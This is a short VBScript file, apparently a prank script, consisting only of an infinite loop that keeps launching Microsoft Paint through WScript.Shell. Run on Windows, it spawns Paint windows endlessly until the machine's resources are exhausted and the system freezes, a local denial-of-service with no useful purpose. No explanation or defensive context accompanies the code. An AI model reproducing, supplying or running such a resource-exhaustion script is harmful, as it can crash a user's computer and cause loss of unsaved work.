Set WshShell = WScript.CreateObject("WScript.Shell")
While true
WshShell.run "mspaint"
Wend